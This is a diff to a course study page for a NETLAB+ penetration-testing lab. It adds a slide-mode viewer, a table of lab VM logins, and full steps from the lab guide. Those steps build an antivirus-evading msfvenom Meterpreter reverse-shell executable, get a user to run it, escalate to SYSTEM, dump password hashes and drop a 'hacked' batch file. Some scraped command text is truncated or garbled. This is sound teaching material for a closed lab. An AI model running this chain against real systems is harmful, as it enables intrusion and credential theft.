@@ -191,6 +191,40 @@
   .evidence li input{width:20px;height:20px;margin-top:.12rem;accent-color:var(--violet);flex:none}
   .evidence .shot{font-weight:600;color:var(--ink)}
   @media print{.evidence li input{-webkit-appearance:checkbox;appearance:checkbox}}
+
+#fullsteps .step h3.fh{font-weight:600;font-size:.95rem;line-height:1.5;margin:0;display:block}
+#fullsteps .step h3.fh .n{margin-right:.5rem}
+#fullsteps .shotmark{margin:.55rem 0 0;padding:.5rem .7rem;border-left:3px solid var(--accent);background:var(--surface-2);border-radius:6px;font-size:.88rem;color:var(--ink)}
+#fullsteps .shotmark b{color:var(--accent)}
+
+.pm-toggle.ctl{cursor:pointer}
+html[data-present="on"] nav.toc,
+html[data-present="on"] .hero .lede,
+html[data-present="on"] .hero .chips,
+html[data-present="on"] footer.site,
+html[data-present="on"] .done-row{display:none!important}
+html[data-present="on"] #main{max-width:100%}
+html[data-present="on"] .hero{margin-top:.6rem}
+html[data-present="on"] .hero h1{font-size:1.25rem;margin-top:.2rem}
+html[data-present="on"] #main > section{display:none;margin-top:1rem}
+html[data-present="on"] #main > section.pm-current{display:block;animation:pm-fade .18s ease;font-size:1.04rem}
+@keyframes pm-fade{from{opacity:0}to{opacity:1}}
+html[data-present="on"] .call.auth{display:none!important}
+html[data-present="on"][data-pm-index="0"] .call.auth{display:block!important}
+.pm-dock{display:none}
+html[data-present="on"] .pm-dock{position:fixed;left:0;right:0;bottom:0;z-index:2147483100;display:flex;
+  align-items:center;gap:8px;padding:8px 12px;background:var(--surface);border-top:1px solid var(--border);
+  padding-bottom:calc(8px + env(safe-area-inset-bottom,0px))}
+.pm-dock button{flex:0 0 auto;min-height:40px;min-width:44px;padding:0 14px;cursor:pointer;background:var(--surface-2);
+  color:var(--ink);border:1px solid var(--border);border-radius:8px;font:inherit;font-size:.85rem}
+.pm-dock button:hover{background:var(--accent);color:var(--accent-ink,#06240f)}
+.pm-dock button:disabled{opacity:.4;cursor:not-allowed}
+.pm-dock button:disabled:hover{background:var(--surface-2);color:var(--ink)}
+.pm-dock .pm-where{flex:1 1 auto;text-align:center;min-width:0;font-size:.78rem;color:var(--muted)}
+.pm-dock .pm-where b{color:var(--ink);display:block;font-size:.9rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+@media print{.pm-dock,.pm-toggle{display:none!important}}
+html[data-present="on"] #ca-launch{display:none!important}
+
 </style>
 </head>
 <body>
@@ -206,6 +240,7 @@
       </div>
       <button class="ctl" id="theme-toggle" aria-pressed="false">🌙 Dark</button>
       <button class="ctl" id="print-btn">🖨 Print</button>
+          <button class="ctl pm-toggle" id="pmToggle" type="button">⇤ Lab mode</button>
       <button class="ctl" id="clear-btn">Clear progress</button>
     </div>
   </div>
@@ -238,6 +273,7 @@
       <li><a href="#overview">Overview</a></li>
       <li><a href="#environment">The environment</a></li>
       <li><a href="#walkthrough">The attack chain, explained</a></li>
+      <li><a href="#fullsteps">Full lab steps</a></li>
       <li><a href="#reference">Command reference</a></li>
       <li><a href="#stuck">Where people get stuck</a></li>
       <li><a href="#defend">The defender's view</a></li>
@@ -259,6 +295,7 @@
   <section id="environment" data-track>
     <h2>The environment you're working in</h2>
     <p>Your attack box is <strong>Kali</strong> at <code class="inl">192.168.0.2</code>; the victim is a <strong>Windows</strong> VM in the pod. You'll host a file on Kali's Apache server, catch a connection back in Metasploit, and work inside the resulting session. Everything stays on the private pod network.</p>
+    <div class="tbl-wrap"><table id="cred-table"><thead><tr><th>Machine</th><th>Address</th><th>Sign-in (user / pass)</th></tr></thead><tbody><tr><td><b>Kali Linux</b></td><td><code>192.168.9.2 / 192.168.0.2</code></td><td><code>root</code> / <code>toor</code></td></tr><tr><td><b>WinOS</b></td><td><code>192.168.0.20</code></td><td><code>Administrator</code> / <code>Train1ng$</code></td></tr><tr><td><b>OpenSUSE</b></td><td><code>192.168.0.30</code></td><td><code>osboxes</code> / <code>osboxes.org</code></td></tr><tr><td><b>Security Onion</b></td><td><code>192.168.0.100</code></td><td><code>ndg</code> / <code>password123</code></td></tr><tr><td><b>pfSense</b></td><td><code>192.168.0.254 / 192.168.68.254</code></td><td><code>admin</code> / <code>pfsense</code></td></tr></tbody></table></div><p class="muted" style="font-size:.84rem;color:var(--muted)">Fixed NETLAB+ pod logins for this lab (case-sensitive); the same every time the pod resets.</p>
     <div class="done-row"><input type="checkbox" id="done-environment" data-done="environment"><label for="done-environment">Mark this section reviewed</label></div>
   </section>
 
@@ -322,6 +359,63 @@
     </div>
     <div class="done-row"><input type="checkbox" id="done-walkthrough" data-done="walkthrough"><label for="done-walkthrough">Mark this section reviewed</label></div>
   </section>
+
+<section id="fullsteps" data-track>
+<h2>Full lab steps</h2>
+<p>Every step from the NDG lab guide, in order — enough to run the lab end to end from this page. The command walkthrough above explains the key commands and the <em>why</em>; this is the complete click-by-click checklist. Watch for the 📸 markers — those are the moments worth a screenshot.</p>
+<div class="step"><h3 class="fh"><span class="n">1</span> To begin, launch the Kali Linux virtual machine to access the graphical login screen. 1.1. Log in as root using the password: toor</h3></div>
+<div class="step"><h3 class="fh"><span class="n">2</span> Launch the WinOS to access the graphical login screen. This will be the target machine. 2.1. Select Send CTRL+ALT+DEL from the dropdown menu to be prompted with the login screen. 2.2. Log in as Administrator using the password: Train1ng$</h3></div>
+<div class="step"><h3 class="fh"><span class="n">3</span> Switch back to the Kali Linux VM to begin. Before starting the lab, ensure that the host machine is on the same network as the target machine. Select the Ethernet network connection from the navigation panel, as seen in item 1. Then click Wired connection eth1 to enable Kali Linux to configure with the IP address 192.168.0.2, as seen in item 2. The target machine is on the network 192.168.0.0/24. The Kali Linux</h3><div class="call tip"><span class="k">Note</span><p>VM is configured with both IP addresses and can easily interchanged.</p></div></div>
+<div class="step"><h3 class="fh"><span class="n">4</span> Let us start by launching nmap. To do this, navigate to Whisker Menu &gt; Information Gathering &gt; Network &amp; Port Scanners &gt; nmap as seen in items 1, 2, 3, and 4 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">5</span> Once started, the Nmap application will appear in a command line terminal, displaying all the switches that can be used to perform scanning. Since you are already familiar with Nmap, let us begin scanning for targets. Type nmap -sP &lt;IP address of the target subnet&gt; then press Enter. The target subnet will be 192.168.0.0/24. -sP means Ping Sweep scan, the result will list the hosts within the specific range that responded to a ping. More details can be viewed under Scan Techniques/Types.</h3><div class="cmd"><pre>root@kali:~# nmap -sP 192.168.0.0/24</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">6</span> Nmap scans all nodes on the given network range and displays all active hosts. The target we are interested in is 192.168.0.20, as seen in item 1. As you can see, we already got some information about the device, such as the latency, which can give an idea of the physical distance a device is from you. There is also the MAC address which can tell the manufacturer of the network card and acts as a physical address as well. Finally, and most importantly, we know that the host is up. The IP address 192.168.0.2 is the Kali Linux host and will not be included in the list, however, it is a part of this subnet.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">7</span> Now that we have identified a target, we can now attempt to enumerate the target to learn the running services and open ports by performing a SYN scan. To do this, type nmap -sSV -O 192.168.0.20, then press Enter. The IP address used in this lab is 192.168.0.30. This command initiates a stealthy SYN scan with version detection along with OS detection. Version detection collects information about the specific service running on an open port, including the product name and version number.</h3><div class="cmd"><pre>root@kali:~# nmap -sSV -O 192.168.0.20</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">8</span> NMAP performs the scan and displays the versions of the services, along with the OS fingerprint, as seen in items 1 and 2 below. In the results, you can see that there are 5 open ports running different services. There was no confirmed result for the OS fingerprint, but the running services and Service Info indicates that it is a Microsoft Windows system. This is important for us as we will be preparing an exploit, and we need to know the target's operating system. Often times the scans may not produce confirm reports, however, other details can be leveraged to assist in identifying the target OS. Identifying Payload Modules</h3></div>
+<div class="shotmark">📸 <b>Screenshot for your report:</b> <span class="shot">Target identified.</span> The scan showing the victim's OS and services.</div><div class="step"><h3 class="fh"><span class="n">1</span> The terminal window should still be open in the Kali VM. Let us continue by typing the command sudo msfconsole and press Enter, as seen in item 1. root@kali:~# sudo msfconsole</h3></div>
+<div class="step"><h3 class="fh"><span class="n">2</span> Metasploit Framework has several payloads and exploits for different operating systems, but the ones we are interested in are for Windows. The easiest way is to use the search command to locate exploits with the "windows" tag. However, since Windows has had several vulnerabilities in the past, we will see quite a few. Let us be more specific and type the command search windows/meterpreter/reverse_tcp and press Enter as seen in item 1 below.</h3><div class="cmd"><pre>msf5 &gt; search windows/meterpreter/reverse_tcp</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">3</span> As you can see, a list of available payloads is displayed within the terminal window. For this exercise, we will choose the payload windows/meterpreter/reverse_tcp. Type the command set payload windows/meterpreter/reverse_tcp and press Enter as seen in item 1. Alternatively, you can use the command use &lt;No.+&gt; in this instance the No. 2 as seen in item 2 above. The number maybe different in your environment. Please make sure the payload is identical to what is in this lab.</h3><div class="cmd"><pre>msf5 &gt; set payload windows/meterpreter/reverse_tcp</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">4</span> Now, let us look at the parameters this payload requires. Type the command show options and press Enter, as seen in item 1 below. Here, you will notice that it requires a local host (LHOST), as seen in item 2, which is the IP address of the Kali Linux VM and a local port (LPORT) and Exit Function (EXITFUNC). The port number or the exit function is not as important as the host IP address, so for now, we can leave both as the default, as seen in items 3 and 4 below. msf5 payload(windows/meterpreter/reverse_tcp) &gt; show options</h3></div>
+<div class="step"><h3 class="fh"><span class="n">5</span> Now that we know the module requirements, let us move to the next step and create the payload. Type the command exit and press Enter to exit the console, as seen in item 1 below. Configuring Web Server</h3><div class="cmd"><pre>msf5 payload(windows/meterpreter/reverse_tcp) &gt; exit</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">1</span> Now that we know that the target is a Windows system, we can begin preparing the exploit. We will be using a webpage to host the exploit and have the user of the target machine (you) download the file and run it on the target system. This is emulating the social engineering techniques where the user is given reason to think that the website and its application are legitimate. Let us begin by starting up a web server on our Kali Linux system. Let us check its status to see if it is already running. To do this, type the command systemctl status apache2 and press Enter as seen in item 1. As you can see in the status identifier called Active, the service is inactive (dead), as seen in item 2 below. root@kali:~# systemctl status apache2</h3></div>
+<div class="step"><h3 class="fh"><span class="n">2</span> Since we know the service is not running, let us start and confirm that it is running before we proceed. Type the command systemctl start apache2 and press Enter as seen in item 1. Next, type systemctl status apache2 and press Enter as seen in item</h3></div>
+<div class="step"><h3 class="fh"><span class="n">2</span> Observe that the Active tag now shows that the service is running, as seen in item 3 below. root@kali:~# systemctl start apache2 root@kali:~# systemctl status apache2</h3><div class="call tip"><span class="k">Note</span><p>To exit the system control status check, press Ctrl+C to exit.</p></div></div>
+<div class="step"><h3 class="fh"><span class="n">3</span> By default, the Apache server will not allow access to the resources located at /var/www/html. Since this will be the destination of the created payload, let us remove the default index.html file. Type the command rm /var/www/html/index.html and press Enter as seen in item 1 below. This will delete the index.html file from the path. If the index.html file is not removed, the Apache web server will display this web pages and you will be unable to get access to the file need to exploit the Windows system.</h3><div class="cmd"><pre>root@kali:~# rm /var/www/html/index.html</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">4</span> Before we create a payload to exploit the Windows system, let us create a directory to store the malicious file. Since we are using the Apache web server, we will create a folder in the location /var/www/html. To do this, type the command mkdir /var/www/html/lab21 and press Enter to create the directory named lab21, as seen in item 1 below. Creating Payload for Target machine</h3><div class="cmd"><pre>root@kali:~# mkdir /var/www/html/lab21</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">1</span> Now, type the command msfvenom -help and press Enter as seen in item 1 below. This will generate the use cases of the tool and the options they use. Item 2 displays an example of how the command is written. Let us make our own payload for the Windows device we started earlier. root@kali:~# msfvenom -help</h3></div>
+<div class="step"><h3 class="fh"><span class="n">2</span> Type the command msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' LHOST=192.168.0.2 LPORT=4444 -f exe &gt; /var/www/html/lab21/exploit.exe and press Enter as seen in item 1 below. x86/shikata_ga_nai -i 6 -b '\x00' LHOST=192.168.0.2 LPORT=4444 -f exe &gt; The part of the command that has meterpreter/reverse_tcp indicates what payload we will be using. The next part that has -e x86/shikata_ga_nai is an encoder we can use to help prevent antivirus from detecting the malicious program. The part that has - i 5-b '\x00', will remove bad characters from the payload to help evade intrusion detection systems. The LHOST and LPORT portions are the IP address of our Kali system and the port we will be listening on, respectively. The -f exe is the extension the file will receive and the exploit.exe is the name of the malicious file. Accessing and Executing the Malicious Payload</h3><div class="cmd"><pre>root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e
+/var/www/html/lab21/exploit.exe</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">1</span> Now that we have created the malicious executable file and saved it in the Apache server, let us go back to the Windows VM and download the file. In the Windows VM, click the Google Chrome web browser from the taskbar, as seen in item 1 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">2</span> The Google Chrome web browser will open. Type 192.168.0.2 in the address bar as seen in item 1 below and press Enter. Next, click lab21 from the web page that appears, as seen in item 2.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">3</span> You will be taken to the directory that holds the exploit.exe file. Click the exploit.exe file seen in item 1 to download it. A prompt will appear at the bottom of the window stating that the file can harm the computer. Click Keep, as seen in item 2, to ignore the warning and continue the download. By default, this file is stored in C:\Users\Administrator\Downloads. Do not execute the payload just yet. The Listener on the Kali Linux VM first needs to be running.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">4</span> Once the download is complete, switch back to the Kali Linux VM so that we start the listener. The terminal window should still be open in the Kali VM. Let us continue by typing the command sudo msfconsole and press Enter as seen in item 1. root@kali:~# sudo msfconsole</h3></div>
+<div class="step"><h3 class="fh"><span class="n">5</span> Now, type the command use exploit/multi/handler and press Enter as seen in item 1 below. msf5 &gt; use exploit/multi/handler</h3></div>
+<div class="step"><h3 class="fh"><span class="n">6</span> Within the Metasploit Framework, there are several payloads and exploits for different operating systems, but the ones we are interested in are for Windows. You can use the search command to locate exploits with the Windows tag. There are almost 2000 exploits just for the Windows tag so, for this exercise, we will be a bit more specific so we can identify the specific exploit we intend to use. Let us type the command search windows/meterpreter and press Enter as seen in item 1 below. You can use the command search windows to view the full suite of exploits for Windows targets.</h3><div class="cmd"><pre>msf5 exploit(multi/handler) &gt; search windows/meterpreter</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">7</span> As you can see, a list of available payloads is displayed within the terminal window. For this exercise, we will choose the payload named payload/windows/meterpreter/reverse_tcp. If you are unable to see the full list, scroll down to No 22. Type the command set payload windows/meterpreter/reverse_tcp and press Enter as seen in item 1. msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</h3></div>
+<div class="step"><h3 class="fh"><span class="n">8</span> Now, let us look at the parameters this payload requires. Type the command show options and press Enter as seen in item 1 below. Here you will notice that it requires a local host (LHOST) as seen in item 2, which is the IP address of the Kali Linux VM and a local port (LPORT). The port number is not as important as the host IP address, so for now, we can leave it as the default, as seen in item 3 below. msf5 exploit(multi/handler) &gt; show options</h3></div>
+<div class="step"><h3 class="fh"><span class="n">9</span> Let us set the LHOST by typing the command set LHOST 192.168.0.2 and press Enter as seen in item 1 below. Then type the command show options and press Enter to confirm the local host IP address was added successfully, as seen in items 2 and 3 below. msf5 exploit(multi/handler) &gt; set LHOST 192.168.0.2 msf5 exploit(multi/handler) &gt; show options 192.168.0.2 is the IP address of the Kali Linux machine.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">10</span> Now that the listener is all set up, start listening by typing the command exploit -j -z and press Enter as seen in item 1 below. If you see the message, 'Exploit completed, but no session was created,' then it means we need to execute the program we downloaded on the Windows VM. msf5 exploit(multi/handler) &gt; exploit -j -z -j and -z are option tags that tell the exploit to run the job and do not interact with the session, respectively, after the connection is made.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">11</span> Now let us switch to the Windows VM and execute the malicious program. Once there, open Windows File Explorer and click the Downloads folder in the navigation pane, as seen in items 1 and 2 below. Once there, double-click the exploit.exe file, as seen in item 3, to execute it. If a pop-up prompt shows "SmartScreen can't be reached right now", click Run.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">12</span> Let us switch back to the Kali Linux VM to see the changes. As you can see in item 1, the Meterpreter session 1 is now opened. You can see the IP addresses of both computers, the ports they are using, and the time the session started. An interactive session should start, and then you will be given access to the meterpreter shell, as seen in item 2 below.</h3></div>
+<div class="shotmark">📸 <b>Screenshot for your report:</b> <span class="shot">Session opened.</span> The handler reporting a Meterpreter session.</div><div class="step"><h3 class="fh"><span class="n">13</span> The Meterpreter shell will start. This means that we have successfully accessed and exploited the Windows VM, but we will not stop here. A good hacker tries to learn as much they can about the target as possible, for example, the victim's network interfaces, system information, etc. We are now interchanging between system hacking and the enumeration phase. Let us start by typing the sysinfo command and pressing Enter, as seen in item 1.</h3><div class="cmd"><pre>Meterpreter &gt; sysinfo</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">14</span> As you can see from the results, we are able to gather more information such as the NetBIOS name, the OS version, the Domain, and the number of Logged On Users, as seen in item 1 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">15</span> Now let us find out what directory we are currently in. To do this, type pwd and press Enter as seen in item 1 below. As you can see from the results, we are in the same Downloads directory we downloaded the program to, as seen in item 2. Now let us find out which other files are in this directory. Type the command ls and press Enter, as seen in item 3 below. As you can from the results see in item 4, exploit.exe is still in the folder.</h3><div class="cmd"><pre>Meterpreter &gt; pwd
+Meterpreter &gt; ls</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">16</span> Now, let us get some network information. Type the command ifconfig and press Enter as seen in item 1. As you can see from the results, we can learn the MAC address, IPv4, and IPv6 addresses and subnets, seen in item 2.</h3><div class="cmd"><pre>Meterpreter &gt; ifconfig</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">17</span> Now let us find out whose user account we are using. To do this, type getuid and press Enter as seen in item 1. As seen in item 2, the username is Administrator, which is the same user account that the program was executed from. Let us try to elevate our privilege and get more control. To do this, type getsystem as seen in item 3 below. Now let us confirm that it worked by typing getuid and pressing Enter as seen in item 4. As you can see from the results in item 5, we are now using the all- powerful SYSTEM account.</h3><div class="cmd"><pre>Meterpreter &gt; getuid
+Meterpreter &gt; getsystem
+Meterpreter &gt; getuid</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">18</span> It is good that we were able to take over the SYSTEM account as we want to dump the password hashes for the system, which we could not do with the regular Administrator account. To dump the hashes, type run hashdump and press Enter as seen in item 1 below. As you can see from the results in item 2, the password hashes are all listed. These hashes can be used with password cracking tools like john the ripper to get the plaintext password. We will not do anything with these hashes in this lab as the cracking will be covered in Lab 22: Registry - Windows Security Account Manager. At this point, you would begin password cracking using hashes generated during the dump. However, this is covered in a different lab. Creating, Uploading, and Executing a Bash File to Target Machine</h3><div class="cmd"><pre>Meterpreter &gt; run hashdump</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">1</span> Let us create a batch file to upload to the computer and execute it so that the user will see it. We will use the terminal to create it, so let us open a new terminal window. To do this, click the Terminal icon from the taskbar, as seen in item 1. Once the new window appears, type the command touch hacked.cmd as seen in item 2. Next, type vim hacked.cmd and press Enter as seen in item 3 below. This will open the text editor within the terminal window.</h3><div class="cmd"><pre>root@kali:~# touch hacked.cmd
+root@kali:~# vim hacked.cmd</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">2</span> Press i to enter insert mode, and it will allow you to modify the file. Let us type the commands we want the batch file to issue to the target machine, as seen in item 1 below. After you finish typing the commands, press Esc to return to visual mode. There we will type :x to save and exit the vim text editor, as seen in item 2 below. echo YOU HAVE BEEN HACKED The command dir /s c:\users\*.* lists all files, folders, and subfolders in the path c:\users. The command echo YOU HAVE BEEN HACKED displays the sentence YOU HAVE BEEN HACKED in the command prompt. The pause command prevents the window from closing automatically.</h3><div class="cmd"><pre>@echo off
+dir /s c:\users\*.*
+pause</pre></div><div class="call tip"><span class="k">Note</span><p>The command @echo off hides the term echo from being displayed.</p></div></div>
+<div class="shotmark">📸 <b>Screenshot for your report:</b> <span class="shot">Privilege change.</span> <code class="inl">getuid</code> before and after <code class="inl">getsystem</code>.</div><div class="step"><h3 class="fh"><span class="n">3</span> Now let us leave a note for the victim. Type the command upload hacked.cmd C:\\users\\administrator\\downloads and press Enter as seen in item 1 below. As you can see in item 2, the file was successfully uploaded.</h3><div class="cmd"><pre>meterpreter &gt; upload hacked.cmd C:\\users\\administrator\\downloads</pre></div></div>
+<div class="step"><h3 class="fh"><span class="n">4</span> Now let us execute the batch file we uploaded. To do this, type the command execute -f hacked.cmd and press Enter as seen in item 1. If the execution was successful, you will see a message stating that a process was created and provide the process ID as seen in item 2.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">5</span> Switch back to the Windows VM to observe the process. As you can see in item 1, a command prompt was opened and shows a list of files from the path we specified and the message YOU HAVE BEEN HACKED as seen in items 1 and 2 below.</h3></div>
+<div class="step"><h3 class="fh"><span class="n">6</span> You successfully exploited the Windows VM. This is the end of the lab; close all open windows/terminals to complete the lab.</h3></div>
+<div class="done-row"><input type="checkbox" id="done-fullsteps" data-done="fullsteps"><label for="done-fullsteps">Mark this section reviewed</label></div>
+</section>
 
   <section id="reference" data-track>
     <h2>Command reference — for understanding the chain</h2>
@@ -543,5 +637,53 @@
 })();
 </script>
 <script src="assistant.js" defer></script>
+
+<script>
+(function(){
+  "use strict";
+  var root=document.documentElement,slides=[],idx=0,toggle,dock,prevBtn,nextBtn,countEl,nameEl;
+  function labelFor(s){var h=s.querySelector("h2");return h?h.textContent.trim():s.id;}
+  function show(i){
+    idx=Math.max(0,Math.min(slides.length-1,i));
+    slides.forEach(function(s,n){s.classList.toggle("pm-current",n===idx);});
+    root.setAttribute("data-pm-index",String(idx));
+    if(countEl)countEl.textContent=(idx+1)+" / "+slides.length;
+    if(nameEl)nameEl.textContent=labelFor(slides[idx]);
+    if(prevBtn)prevBtn.disabled=idx===0;
+    if(nextBtn)nextBtn.disabled=idx===slides.length-1;
+    window.scrollTo(0,0);
+  }
+  function enter(){
+    slides=Array.prototype.slice.call(document.querySelectorAll("#main > section"));
+    if(!slides.length)return;
+    root.setAttribute("data-present","on");
+    if(dock)dock.setAttribute("aria-hidden","false");
+    if(toggle)toggle.textContent="\u21E4 Exit lab mode";
+    show(0);
+  }
+  function exit(){
+    root.removeAttribute("data-present");root.removeAttribute("data-pm-index");
+    slides.forEach(function(s){s.classList.remove("pm-current");});
+    if(dock)dock.setAttribute("aria-hidden","true");
+    if(toggle)toggle.textContent="\u21E4 Lab mode";
+  }
+  toggle=document.getElementById("pmToggle");
+  if(toggle)toggle.addEventListener("click",function(){root.getAttribute("data-present")==="on"?exit():enter();});
+  dock=document.createElement("div");dock.className="pm-dock";dock.id="pmDock";dock.setAttribute("aria-hidden","true");
+  dock.innerHTML='<button type="button" data-pm="prev">\u25C0 Prev</button>'+
+    '<div class="pm-where"><span id="pmCount"></span><b id="pmName"></b></div>'+
+    '<button type="button" data-pm="next">Next \u25B6</button>'+
+    '<button type="button" data-pm="exit" aria-label="Exit lab mode">\u2715</button>';
+  document.body.appendChild(dock);
+  prevBtn=dock.querySelector('[data-pm="prev"]');nextBtn=dock.querySelector('[data-pm="next"]');
+  countEl=dock.querySelector("#pmCount");nameEl=dock.querySelector("#pmName");
+  dock.addEventListener("click",function(e){var t=e.target.closest("[data-pm]");if(!t)return;
+    var a=t.getAttribute("data-pm");if(a==="prev")show(idx-1);else if(a==="next")show(idx+1);else exit();});
+  document.addEventListener("keydown",function(e){if(root.getAttribute("data-present")!=="on")return;
+    if(e.key==="ArrowRight"||e.key==="PageDown"){show(idx+1);e.preventDefault();}
+    else if(e.key==="ArrowLeft"||e.key==="PageUp"){show(idx-1);e.preventDefault();}
+    else if(e.key==="Escape"){exit();}});
+})();
+</script>
 </body>
 </html>
